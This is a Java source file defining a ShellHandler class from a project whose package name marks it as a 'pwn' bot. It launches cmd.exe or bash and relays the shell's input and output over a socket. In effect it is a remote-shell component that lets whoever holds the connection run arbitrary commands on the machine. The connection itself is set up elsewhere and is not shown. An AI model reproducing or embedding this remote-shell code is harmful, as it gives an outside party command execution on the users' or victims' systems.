package com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.handlers;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import lombok.Getter;
import lombok.Setter;
import org.apache.commons.lang3.SystemUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class ShellHandler {

    Logger logger = LoggerFactory.getLogger(getClass());
    @Getter
    @Setter
    private Thread shellThreadReader;
    @Getter
    @Setter
    private Thread shellThreadWriter;

    private ProcessBuilder processBuilder;

    PrintWriter socketWrite;
    BufferedReader socketRead;

    PrintWriter commandWrite;
    BufferedReader commandRead;

    public void init() {
        this.processBuilder = new ProcessBuilder();
        if (SystemUtils.IS_OS_WINDOWS) {
            processBuilder.command("cmd.exe");
        } else if (SystemUtils.IS_OS_LINUX) {
            processBuilder.command("bash");
        }
        processBuilder.redirectErrorStream(true);

    }

    public void start() {
        this.shellThreadReader = new Thread(() -> {
            try {

                Process p = processBuilder.start();
                commandWrite = new PrintWriter(p.getOutputStream());
                commandRead = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                while ((line = commandRead.readLine()) != null) {
                    socketWrite.println(line);
                    socketWrite.flush();
                }
                p.destroy();
            } catch (Exception e) {
                logger.error("", e);
            }
        });

    }

    public void getCommand() {//TODO IN MAIN THREAD ?
        String foo;
        try {
            while ((foo = socketRead.readLine()) != null) {
                commandWrite.println(foo);
                commandWrite.flush();
            }
        } catch (Exception e) {
            logger.error("", e);
        }
    }

    void executeCMD(String line) {
        commandWrite.println(line);
        commandWrite.flush();
    }

}
